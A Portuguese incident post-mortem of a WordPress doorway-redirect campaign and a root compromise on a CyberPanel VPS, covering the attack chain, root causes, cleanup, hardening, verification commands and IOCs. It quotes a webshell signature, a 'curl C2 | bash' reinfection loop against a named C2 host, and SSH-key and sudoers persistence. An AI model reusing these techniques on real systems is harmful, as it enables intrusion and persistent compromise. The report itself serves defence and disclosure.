@@ -1,0 +1,310 @@
+================================================================================
+POST-MORTEM CONSOLIDADO — INCIDENTE DE SEGURANCA
+Campanha de Doorway (WordPress) + Comprometimento de ROOT (servidor)
+VPS Contabo 94.72.113.139 (vmi2566650)
+================================================================================
+
+Classificacao......: CRITICO (invasao ativa com acesso de root/administrador)
+Origem da infeccao.: ~18/08/2025 (1a modificacao de arquivos; migrou junto com os
+                     sites para este VPS em ~out/2025)
+Escalada e resposta: 07/08/2026 (re-plantio) -> 08/08/2026 (1a resposta, camada
+                     WordPress) -> 14-15/08/2026 (2a resposta, camada servidor/root)
+Plataforma.........: AlmaLinux 9.5 | CyberPanel | OpenLiteSpeed
+Escopo.............: rede de ~42-116 sites WordPress (noobnews / clopnews / hentips /
+                     sbtmoney / 123milhass / curriculogratis / ocurriculocerto ...)
+Status atual.......: RESOLVIDO — doorway eliminado e verificado; root comprometido
+                     ERRADICADO; servidor endurecido e reiniciado; sites 200.
+Documento..........: v3 (consolidado) — 15/08/2026
+
+
+--------------------------------------------------------------------------------
+1. SUMARIO EXECUTIVO (para nao tecnicos)
+--------------------------------------------------------------------------------
+Uma rede de sites foi INVADIDA por uma campanha de "doorway" (redirecionamento):
+visitantes de CELULAR vindos do Google eram jogados para paginas de terceiros
+(encurtadores "ushort"), com risco de perda de trafego/receita e de o Google
+marcar os dominios como perigosos (derrubando SEO/AdSense de toda a rede).
+
+A invasao aconteceu em DOIS NIVEIS, e foi entendida em DUAS ETAPAS:
+
+  NIVEL 1 — WordPress (visivel): o invasor entrou com uma SENHA DE ADMIN VALIDA
+  (a senha unica/compartilhada da equipe, vazada), subiu um "tema" falso que era
+  um programa espiao (webshell) e injetou o redirecionamento. Isto foi detectado e
+  RESPONDIDO em 08/08/2026 (limpeza do WordPress em toda a rede).
+
+  NIVEL 2 — Servidor/ROOT (oculto): NO MESMO 08/08, o invasor usou a MESMA senha
+  compartilhada para logar como ROOT no servidor (via SSH) e instalou um "motor de
+  reinfeccao" que, a cada 30 minutos, baixava e reexecutava o virus direto no disco
+  — REESCREVENDO os arquivos ja limpos. Como esse motor rodava no nivel do sistema
+  (fora do WordPress), ele DRIBLAVA as protecoes de WordPress e refazia a infeccao.
+  Foi ISTO que fez o site "reinfectar depois de um tempo". Este nivel so pode ser
+  visto e removido com ACESSO DE ROOT ao servidor — que a equipe nao possuia. O
+  acesso foi obtido apenas no dia seguinte, e a erradicacao ocorreu em 14-15/08.
+
+Ao final: o motor de reinfeccao foi destruido, todas as camadas do virus removidas,
+as causas-raiz fechadas, o servidor atualizado e reiniciado, e TODAS as credenciais
+(inclusive as de banco de dados) rotacionadas. A infeccao nao retornou.
+
+
+--------------------------------------------------------------------------------
+2. CONTEXTO OPERACIONAL E DE ACESSO (por que foram duas etapas)
+--------------------------------------------------------------------------------
+Este servidor e sua configuracao estavam sob GESTAO ANTERIOR. Pontos de fato:
+
+  - A infeccao de doorway JA VEIO junto com os sites quando foram migrados para
+    este VPS (arquivos maliciosos datam de 2025, antes desta plataforma).
+  - A configuracao do servidor, como recebida, tinha as portas de entrada abertas
+    que permitiram a escalada a root (ver secao 5): login de root por SENHA aberto
+    a internet, banco de dados exposto publicamente, sistema sem atualizacoes e sem
+    protecao de forca-bruta. Nenhuma dessas condicoes foi introduzida pela equipe
+    atual — sao anteriores ao seu envolvimento.
+  - A equipe tinha acesso ao WORDPRESS dos sites, mas NAO tinha acesso de ROOT/SO
+    ao servidor. Por isso a 1a resposta (08/08) atuou corretamente na unica camada
+    alcancavel — o WordPress — e nao tinha como enxergar o motor de reinfeccao no
+    nivel do sistema operacional.
+  - Quando o problema estourou, a equipe atual foi colocada para resolver um
+    servidor que NUNCA havia operado. O acesso de root precisou ser recuperado
+    durante a propria resposta e so foi obtido no DIA SEGUINTE. Durante a
+    recuperacao de acesso, o IP da equipe chegou a ser BLOQUEADO pela protecao do
+    proprio servidor — refletindo um ambiente ainda hostil e sob controle ativo do
+    intruso (o motor de reinfeccao seguia vivo, reexecutando a cada 30 min).
+  - Foi necessario aprender a operar o ambiente Contabo/CyberPanel em paralelo a
+    contencao, sob pressao de incidente.
+
+Resumo honesto: a origem foi uma configuracao herdada e uma infeccao que veio de
+fora; a 1a resposta resolveu o que era visivel/alcancavel; a persistencia real
+estava no nivel de servidor, so acessivel depois — e foi eliminada assim que o
+acesso permitiu.
+
+
+--------------------------------------------------------------------------------
+3. COMO O ATAQUE FUNCIONAVA (cadeia confirmada em logs e arquivos)
+--------------------------------------------------------------------------------
+VETOR A — WordPress (camada visivel):
+  1) LOGIN com credencial VALIDA (nao foi forca bruta):
+       POST /wp-login.php -> 302 (sucesso) do IP 216.126.229.185
+  2) UPLOAD de tema malicioso:
+       POST /wp-admin/update.php?action=upload-theme -> 200
+       Temas falsos que sao webshell: "upmibpk", "xdpelfa".
+  3) EXECUCAO do webshell (auto-decodificador, familia AnonymousFox):
+       GET /wp-content/themes/xdpelfa/archive.php
+       eval(gzuncompress(str_replace(... file_get_contents(__FILE__) ...)))
+  4) INJECAO do redirect (encurtador passado em base64 por parametro):
+       ?domain=dXNob3J0Lm9ic2VydmVyL0pE...  -> ushort.observer/JDseQHdTw0r4
+  5) PERSISTENCIA no WordPress: admins escondidos, webshells em varias pastas,
+     option "home" sequestrada, injecao no post_content do banco.
+
+VETOR B — Servidor/ROOT (camada oculta, mesma janela):
+  1) LOGIN de ROOT por SENHA (a mesma senha compartilhada), via SSH:
+       do IP 91.92.42.7, em 08/08 ~20:37 (horario de Brasilia). Nota de fuso: o
+       servidor registra os logs em horario de Chicago (CDT, UTC-5), 2h atras de
+       Brasilia; portanto as 18:37 do log = 20:37 em Brasilia.
+  2) PERSISTENCIA de sistema:
+       - Chave SSH propria ("ElPatrono1337") em 120 authorized_keys (imutaveis).
+       - Sudoers NOPASSWD:ALL em 120 contas.
+       - Minerador de criptomoeda (Kinsing) com watchdog.
+       - MOTOR DE REINFECCAO: servico "myservices.service" -> /usr/bin/ssshd, que a
+         cada 30 min fazia "curl C2 | bash" (C2 195.24.237.240 /.x/black3). Este
+         motor REESCREVIA os arquivos do doorway direto no disco, como root,
+         DRIBLANDO o DISALLOW_FILE_MODS (que so bloqueia o painel WordPress).
+
+Cloaking: o redirect so disparava para quem chegava de CELULAR e vindo de busca do
+Google — por isso, no desktop e ja logada, a equipe muitas vezes "nao via" o
+problema.
+
+
+--------------------------------------------------------------------------------
+4. POR QUE REINFECTAVA "DEPOIS DE UM TEMPO" (a peca que faltava)
+--------------------------------------------------------------------------------
+A 1a resposta (08/08) fez o correto na camada WordPress: rotacionou as senhas de
+admin, aplicou DISALLOW_FILE_MODS (fecha o upload-theme pelo painel), limpou banco,
+"home" e arquivos. Isso fecha o VETOR A.
+
+Mas o VETOR B (root) continuava aberto: a senha de ROOT do servidor era a MESMA
+senha compartilhada e nao estava sob controle da equipe (sem acesso de root). Com
+root, o motor de reinfeccao reescrevia o doorway a cada 30 min, no disco,
+IGNORANDO todas as protecoes de WordPress. Resultado: a limpeza de WordPress era
+desfeita sozinha pouco depois. Enquanto o nivel de servidor nao foi acessado e
+limpo (14-15/08), a reinfeccao continuou. Uma vez destruido o motor e fechado o
+login de root por senha, a reinfeccao parou.
+
+
+--------------------------------------------------------------------------------
+5. CAUSA-RAIZ
+--------------------------------------------------------------------------------
+Causa-raiz PRIMARIA:
+    SENHA UNICA/COMPARTILHADA VAZADA — usada tanto para o ADMIN do WordPress
+    (vetor A) quanto para o ROOT do servidor via SSH (vetor B). Um unico vazamento
+    deu acesso a toda a rede E ao servidor.
+
+Causas-raiz CONTRIBUINTES (condicoes herdadas, anteriores a equipe atual):
+    - Login de ROOT por SENHA aberto a internet (permitiu o vetor B).
+    - Banco de dados MariaDB EXPOSTO em 0.0.0.0:3306.
+    - Sistema sem atualizacoes de seguranca (186 pendentes) e sem fail2ban.
+    - Infeccao de doorway migrada junto com os sites (origem em 2025).
+    - Repositorio de pacotes apontando para dominio expirado (supply-chain).
+
+
+--------------------------------------------------------------------------------
+6. RESPOSTA — O QUE FOI FEITO (as duas etapas)
+--------------------------------------------------------------------------------
+ETAPA 1 — Camada WordPress (08/08/2026):
+    [x] IPs do invasor bloqueados: 216.126.229.185, 172.86.66.0/24, 172.86.92.0/24.
+    [x] Admins fantasmas (jwpadmin, thradmin — data falsa 1970-10-10) removidos dos
+        42 sites; todas as sessoes encerradas.
+    [x] Limpeza do post_content no banco (regex ANCORADO no dominio do doorway, sem
+        tocar conteudo legitimo). Destaque: fr.ocurriculocerto = 687 posts.
+    [x] Option "home" restaurada em 36 sites (home = siteurl limpo).
+    [x] Cache Yoast corrigido (de.123milhass).
+    [x] Webshells de ".well-known" e "PaxHeaders" quarentenados.
+    [x] Senhas de 27 admins rotacionadas (257 updates); DISALLOW_FILE_MODS na rede.
+    [x] Verificacao: 110 sites testados (celular + referer Google) -> 0 redirecionando.
+    Observacao: falsos-positivos corretamente preservados (getID3, TCPDF, tema real
+    "consultstreet", CSS "menu-shortcut"). Cache do LiteSpeed mascarava a limpeza
+    (exige lswsctrl stop + apagar cachedata + start).
+
+ETAPA 2 — Camada Servidor/ROOT (14-15/08/2026):
+    [x] Motor de reinfeccao (myservices/ssshd) NEUTRALIZADO; C2 bloqueado; confirmado
+        que ainda estava ATIVO (reinfeccao em curso, interrompida).
+    [x] Removidas as 120 chaves "ElPatrono1337" e as 120 regras de sudo NOPASSWD;
+        minerador e watchdog encerrados; marcador oculto removido.
+    [x] Auditoria de persistencia de boot ANTES do reboot (evitou reinfeccao no boot).
+    [x] RE-HIGIENIZACAO dos sites (o doorway havia sido re-injetado pelo motor):
+        core WordPress reinstalado limpo em 44 sites; bloco de redirect removido dos
+        temas (zero na rede); arquivos-porta (pages/search/buy/goods.php) e backdoors
+        em index.php removidos; webshells em pastas de nome aleatorio removidos; um
+        site com loop auto-regenerativo contido com index.php limpo+imutavel.
+    [x] HARDENING: root SOMENTE por chave (senha nao loga mais); MariaDB so em
+        127.0.0.1 (+ firewall 3306); fail2ban instalado; repo morto desabilitado;
+        186 patches de seguranca (kernel/OpenSSH/OpenSSL/sudo); PowerDNS corrigido.
+    [x] Camada de protecao WordPress: mu-plugins de seguranca em 111 sites (bloqueio
+        de criacao de admin oculto, bloqueio de XML-RPC, rate-limit de login).
+    [x] Credenciais rotacionadas: root, CyberPanel, OpenLiteSpeed e SENHAS DE BANCO
+        de 111 sites (com verificacao e rollback por site; 0 falhas).
+    [x] Reboot (kernel novo) + verificacao pos-boot: persistencia ausente, servicos
+        ativos, DNS ok, sites 200, malware zero na rede.
+
+Nota tecnica sobre versao: os sites afetados rodam WordPress 7.0.3, que E UMA VERSAO
+REAL e legitima. O problema nunca foi a versao, e sim a injecao de codigo no
+nucleo/tema. Todos os artefatos removidos foram preservados em quarentena.
+
+
+--------------------------------------------------------------------------------
+7. IMPACTO
+--------------------------------------------------------------------------------
+    - Redirecionamento de visitantes de celular para doorways (perda de trafego/
+      receita; risco de flag do Google em toda a rede).
+    - Controle administrativo total do servidor pelo atacante por ~6 dias (nivel root).
+    - Uso indevido de recursos (mineracao) e hospedagem de conteudo malicioso
+      (doorways de spam/SEO; kit de phishing bancario) a partir da infraestrutura.
+    - Contas de administrador fraudulentas.
+    - Exfiltracao de dados: NAO confirmada. Por prudencia, as credenciais de banco
+      foram consideradas comprometidas e ja substituidas.
+
+
+--------------------------------------------------------------------------------
+8. O QUE MUDAMOS (prevencao)
+--------------------------------------------------------------------------------
+    1) FIM DA SENHA UNICA COMPARTILHADA — senha forte e UNICA por servico + cofre.
+       Foi a causa-raiz dos DOIS vetores (WordPress e root).
+    2) SSH sem senha para root: acesso administrativo agora exige CHAVE.
+    3) Banco de dados NUNCA exposto: escuta somente em localhost.
+    4) DISALLOW_FILE_MODS + mu-plugins de defesa na aplicacao.
+    5) fail2ban + bloqueio de IOCs no firewall.
+    6) Patches de seguranca em dia; kernel atualizado.
+    7) Deteccao de persistencia de sistema ANTES de reiniciar.
+    8) GESTAO DE ACESSO: a equipe responsavel precisa ter acesso documentado e
+       testado a TODA a infraestrutura (inclusive root/SO) ANTES de um incidente —
+       a falta de acesso de root a este servidor foi o que separou a resposta em
+       duas etapas e permitiu a reinfeccao no intervalo.
+    9) Revisao periodica de administradores (contas com data "1970-...", e-mails
+       estranhos) e bloqueio de PHP em uploads/.well-known.
+
+
+--------------------------------------------------------------------------------
+9. COMO VERIFICAR (qualquer pessoa com acesso pode conferir)
+--------------------------------------------------------------------------------
+Servidor (root):
+    grep -rl ElPatrono /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys | wc -l   # 0
+    systemctl is-enabled myservices ; systemctl is-active myservices                      # masked/inactive
+    ss -tlnp | grep 3306                                                                  # 127.0.0.1:3306
+    grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config                                    # prohibit-password
+    systemctl is-active fail2ban                                                          # active
+    grep -lE "define\('A', '[^']*::" /home/*/public_html/*.php | wc -l                    # 0 (doorway)
+
+Por site (WordPress):
+    wp option get home                                                                    # = siteurl (nao doorway)
+    grep -rl 'ushort\.\|u-short\.' <docroot> --include='*.php'                            # vazio
+    wp db query "SELECT COUNT(*) FROM wp_posts WHERE post_content LIKE '%ushort.%'"       # 0
+    wp user list --role=administrator                                                     # sem jwpadmin/thradmin
+    find <docroot> -path '*well-known*' -name '*.php'                                      # vazio
+    curl -A "Android Mobile" -H "Referer: https://www.google.com/" <url-post>             # sem redirect
+
+
+--------------------------------------------------------------------------------
+10. INDICADORES DE COMPROMETIMENTO (IOCs) — CONSOLIDADO
+--------------------------------------------------------------------------------
+IPs do invasor:
+    - 216.126.229.185 ........ login WordPress + upload de tema (vetor A)
+    - 172.86.66.0/24, 172.86.92.0/24 ... uso dos webshells (vetor A)
+    - 91.92.42.7 ............. login de ROOT via SSH (vetor B)
+    - 195.24.237.240 ......... C2 do motor de reinfeccao (vetor B)
+
+Dominios:
+    - Doorway (DDoS-Guard, registro em Belize): ushort.company / ushort.dev /
+      ushort.observer / ushort.today / ushort.org / u-short.net
+    - C2 de fallback: digital.digitaldatainsights.org
+
+Contas fraudulentas:
+    - jwpadmin, thradmin (data de cadastro FALSA: 1970-10-10 10:10:10)
+    - Revisar: "admin" (21 sites) e "novoadmin_noob" (noobnews) — confirmar se sao
+      da equipe ou remover.
+
+Artefatos WordPress:
+    - Temas-webshell: upmibpk, xdpelfa
+    - Webshells: anonymousfox.php, shell.php, 0day.php, tool.php, ws.php, ws0.php,
+      pvt.php, admin.php, t.php — em wp-includes/{html-api,sitemaps,theme-compat,Text},
+      .well-known/{acme-challenge,pki-validation}, uploads/ e na raiz.
+    - Assinatura webshell: eval(gzuncompress(str_replace(... file_get_contents(__FILE__) ...)))
+    - Backdoor em index.php: define('A', 'janNN.ofuXXXX/askul::...')
+    - Injecao de redirect (core+tema): variavel "$lineindexinstall" (meta-refresh) e
+      variante JS matchMedia/location.replace
+    - Arquivos-porta root-level: pages.php, search.php, buy.php, goods.php
+
+Artefatos de sistema (root):
+    - Servico: /usr/lib/systemd/system/myservices.service
+    - Downloader: /usr/bin/ssshd (SHA-256
+      2bcc91fdedb8c583a9fe883be9ad453333a1bba0fdf655474982db3cbb8e7a74)
+    - Marcador oculto: /usr/bin/.locatione ; Minerador: Kinsing em /var/tmp/<hex8>/
+    - Chave SSH: comentario "ElPatrono1337"
+
+NAO confundir (falsos-positivos legitimos): getID3, TCPDF (usam gzuncompress),
+tema real "consultstreet" (ThemeArile), CSS "menu-shortcut" (contem "u-short"),
+"PaxHeaders" (lixo de extracao de tar), Yoast "wpseo-redirects", mu-plugins da
+Hostinger, jetpack-waf, webp-express.
+
+
+--------------------------------------------------------------------------------
+11. RISCOS RESIDUAIS E RECOMENDACOES
+--------------------------------------------------------------------------------
+    - PADRAO-OURO: root ficou comprometido ~6 dias — a recomendacao ideal e
+      RECONSTRUIR (rebuild) o servidor. Optou-se pelo endurecimento in-place para
+      NAO perder os sites; se houver qualquer sinal de reinfeccao, reconstruir.
+    - Restringir os paineis (CyberPanel/OpenLiteSpeed) por IP e/ou habilitar 2FA.
+    - Formalizar o acesso de root da equipe a TODA a infraestrutura.
+    - Manter patches e monitoramento de re-drop por alguns dias.
+    - Se houver flag no Google, pedir revisao no Search Console.
+    - Remover a quarentena e os logs de rotacao apos operacao estavel.
+
+
+--------------------------------------------------------------------------------
+12. OBSERVACAO SOBRE CREDENCIAIS
+--------------------------------------------------------------------------------
+As novas senhas (root, CyberPanel, OpenLiteSpeed, admins WordPress e bancos de
+dados) e as chaves de acesso NAO sao reproduzidas neste documento por seguranca.
+Estao armazenadas em cofre privado da equipe. Este relatorio pode ser compartilhado
+sem expor segredos.
+
+================================================================================
+FIM DO DOCUMENTO
+================================================================================
